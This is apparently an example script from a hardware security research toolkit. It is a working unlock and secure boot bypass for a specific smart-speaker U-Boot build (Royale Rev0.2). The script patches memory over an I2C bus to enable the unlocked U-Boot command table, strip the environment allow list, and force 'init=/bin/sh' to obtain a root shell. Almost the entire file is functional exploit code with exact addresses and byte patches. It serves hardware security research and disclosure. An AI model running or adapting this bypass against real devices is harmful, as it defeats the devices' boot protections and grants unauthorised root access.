#!/usr/bin/env python3
# pylint: disable=invalid-name,redefined-outer-name
#
# Example of a secure boot bypass resulting from exposure of memory access
# operation (i2c command) via interactive U-Boot console.
#
# To run this, the -C, --companion argument must specify the use of
# I2C bus #2 on the target device (assuming we're attached to the bus
# via U10).
#
#   $ ./symfonisk_unlock_bypass.py -C /dev/ttyACM0:i2c_bus=2
#

import re
import sys
import time

from argparse import RawDescriptionHelpFormatter

from depthcharge         import log, uboot
from depthcharge.arch    import Architecture
from depthcharge.cmdline import ArgumentParser, create_depthcharge_ctx
from depthcharge.memory  import MemoryPatchList

# Resolve post-location addresses.
#
# See U-Boot's gd->relocaddr and gd->reloc_off assignments in common/board_f.c
#
# Typically, you can find this information `bd` command output, or by reviewing
# ether configurations of reference platforms or chipset family code corresponding
# your target chipset. (OEMs and product vendors generally don't go changing
# things like this when they're not broken.)
#
def _reloc(addr):
    return addr + 0x8727000


# Locations of command tables in Royale Rev0.2 U-Boot 2016.11 build.
_unlocked_cmds       = _reloc(0x878894a8).to_bytes(4, 'little')
_unlocked_cmds_end   = _reloc(0x87889e64).to_bytes(4, 'little')

_locked_cmds         = _reloc(0x8788a044).to_bytes(4, 'little')
_locked_cmds_end     = _reloc(0x8788a258).to_bytes(4, 'little')

# struct cmd_tbl_s entries. We'll swap out the help alias entry for bootm
_help_alias_entry = uboot.cmd_table.entry_to_bytes(Architecture.get('arm'), {
    'name':     _reloc(0x87863e2a),
    'maxargs':  0x20,
    'cmd_rep':  1,
    'cmd':      _reloc(0x87811e80),
    'usage':    _reloc(0x8786220c),
    'longhelp': _reloc(0x8786d4ca),
    'complete': 0
})

_bootm_entry = uboot.cmd_table.entry_to_bytes(Architecture.get('arm'), {
    'name':     _reloc(0x87862078),
    'maxargs':  0x020,
    'cmd_rep':  1,
    'cmd':      _reloc(0x87811b24),
    'usage':    _reloc(0x8786208e),
    'longhelp': _reloc(0x87881c98),
    'complete': 0
})

_patch_list = MemoryPatchList([
    # --------------------+-----------------------+----------------------+--------------------------------------------
    #  Address            | Value to write        | Pre-patch value      | Description
    # --------------------+-----------------------+----------------------+--------------------------------------------
    #
    # Rewrite all references to the "" command table to the "unlocked" command table
    # The order in which we do this matters since we're fiddling with command lookup while exec'ing commands.
    (_reloc(0x878275d8),    _unlocked_cmds,           _locked_cmds,         'cmd_table_count() locked table ptr'),
    (_reloc(0x878275dc),    _unlocked_cmds_end,       _locked_cmds_end,     'cmd_table_count() locked table end ptr'),
    (_reloc(0x87827590),    _unlocked_cmds,           _locked_cmds,         'cmd_table_start() locked table ptr'),

    # Re-insert bootm into the command table, overwriting the help alias ('?') entry.
    # The do_bootm code (and in fact, an entire linker list entry) still exists,
    # but is just excluded from the unlocked and locked command tables.
    #
    # We use sonosboot in this script, but bootm is "nice to have" for
    # further exploring kernel modification.
    (_reloc(0x87889bfc),    _bootm_entry,           _help_alias_entry,      'Replacement of help alias with bootm'),

    # Environment writes are limited to the follow vars:
    #   bootcmd, bootdelay, ethaddr, netmask, ipaddr, severip and gateway
    #
    # Patch out the device unlock check that results in the amusing
    # "I'm sorry, Dave. I'm afraid I can't do that." quote. 💯
    #
    # Change the call to the env validation function to a
    # "mov r0, #0" (i.e. set return value to target value)
    #
    # Again, we don't actually use this, but it's another handy
    # thing to have for further exploration of the platform.
    (_reloc(0x8781d7bc),    b'\x00\x00\xa0\xe3',    b'\x87\x27\x00\xeb',    'Remove setenv allow list call'),

    # Patch do_sonosboot() to bypass for unlock status check. Always just
    # take the if (unlocked) {...} path to add enable_console=1 and enable_printk=1 to
    # the kernel commandline arguments.
    (_reloc(0x87805660),    b'\x01\x00\xa0\xe3',    b'\xa3\x2e\x00\xeb',    'Enable console and printk'),

    # Similarly, force the if (unlocked) {...} path to enable the kernel
    # command line argument, "firmware_class.path=/jffs"
    (_reloc(0x878056bc),    b'\x01\x00\xa0\xe3',    b'\x8c\x2e\x00\xeb',    ''),

    # /usr/sbin/secure_console.sh prevents us from from actually using the console.
    # Use the ol' init=/bin/sh trick to grab a shell before init scripts run.
    #
    # We'll force the if (unlocked) {...} code path to enable the kernel
    # command line argument, "firmware_class.path=/jffs", and then
    # overwrite this string with "init=/bin/sh \0"
    #
    # From your early root shell, see /etc/Configure and /etc/inittab to learn
    # more about what needs to be done to finish brining up the platform. :)
    #
    (_reloc(0x8785d9d4),    b'init=/bin/sh \0',     b'firmware_class',      'Force init=/bin/sh'),
])


def is_unlocked(ctx):
    # Just a subset of commands available in the "unlocked" command table
    unlocked_cmds = ('editenv', 'dek_blob', 'fuse', 'loadb', 'mw', 'nand', 'ubi')

    # Force read of commainds; do not rely on cached reads
    available = ctx.commands(cached=False, detailed=False)

    for cmd in unlocked_cmds:
        if cmd in available:
            return True

    return False


def is_vulnerable(ctx):
    """
    Attempt to check if target is vulnerable to i2c-based unlock bypass,
    based upon the Sonos-provided (i.e. not the U-Boot) version number.
    """
    ver_regex = re.compile(r'U-Boot \d{4}\.\d{2}-Royale(-Strict)?-Rev(?P<rev>\d{1,}\.\d{1,})\s')
    for info in ctx.version():
        log.debug('Checking version string: ' + info)
        m = ver_regex.match(info)
        if m is not None:
            ver = float(m.group('rev'))
            if ver == 0.2:
                log.info('Vulnerable version detected: ' + info)
                return True

            if ver <= 0.3:
                msg = 'Version may be vulnerable, but our memory patches are specific to v0.2'
                log.error(msg)
            else:
                log.error('Patched or unknown version detected: ' + info)
            return False

    log.error('Did not detect "U-Boot Royale" version string.')
    return False


def post_reboot_cb(ctx):
    ctx.interrupt() # We're responsible for catching the console in this callback
    return perform_unlock_bypass(ctx)

def perform_unlock_bypass(ctx):
    if is_unlocked(ctx):
        log.info("Device is already using 'unlocked' command table.")
        return True

    if not is_vulnerable(ctx):
        log.error('Device does not appear to be vulnerable.')
        return False

    ctx.patch_memory(_patch_list, impl='i2c')
    success = is_unlocked(ctx)
    if success:
        log.info("Success! Device is now using 'unlocked' command table.")
    else:
        log.error("Failed to switch to 'unlocked' command table.")

    return success

_INSPECT_CFG = 'symfonisk_rev0.2_unlock_bypassed.cfg'

def handle_cmdline():
    cmdline = ArgumentParser(companion_required=True)

    cmdline.add_argument('--inspect', default=False, action='store_true',
                         help=('Perform deeper inspection of device following unlock bypass.'
                               ' Results will be written to a file name: ' + _INSPECT_CFG))

    cmdline.add_argument('--boot', default=False, action='store_true',
                         help=('Boot to root shell. If not specified, the '
                               'device will remain in the bypass-unlocked '
                               'U-Boot environment.'))

    return cmdline.parse_args()


if __name__ == '__main__':

    args = handle_cmdline()

    # Use the console timeout parameter to increase the time between commands,
    # just so it's easier for folks watching this demo to see the commands
    # being used under the hood.
    #
    # You can remove the console_kwargs parameter if you just want things
    # to run as fast as possible
    #
    console_kwargs = {'timeout': 0.085}

    ctx = create_depthcharge_ctx(args, console_kwargs=console_kwargs)

    success = perform_unlock_bypass(ctx)
    if success:
        if args.inspect:
            cfg_name = 'symfonsik_rev0.2_unlock_bypassed.cfg'

            msg = ('Addtional device inspection will begin in 5 seconds.\n'
                   '     This will induce a crash and then re-bypass the unlock.\n'
                   '     Results will be saved to: ' + cfg_name)
            log.info(msg)

            # Give the user a moment to digest this
            countdown = ctx.create_progress_indicator('countdown', 5, desc='Delaying')
            for _ in range(0, 5):
                time.sleep(1)
                countdown.update(1)
            ctx.close_progress_indicator(countdown)

            # Close the serial console we were using
            ctx.console.close()

            # Now re-inspect the device in its unlocked state by creating a new context
            # This will require crashing the device to obtain register r9 from ,
            # So we need to re-perform the unlock bypass after this reset.
            args.config = None  # Zap this so we perform inspection

            ctx = create_depthcharge_ctx(args,
                                         post_reboot_cb=post_reboot_cb,
                                         post_reboot_cb_data='self',
                                         console_kwargs=console_kwargs)

            ctx.save(_INSPECT_CFG)

        if args.boot:
            log.info('Sending sonosboot command. Device will enter fallback root shell.')
            log.note('Refer to /etc/Configure and /etc/inittab to finish initializing the platform.')
            ctx.send_command('sonosboot', read_response=False)
    else:
        sys.exit(1)
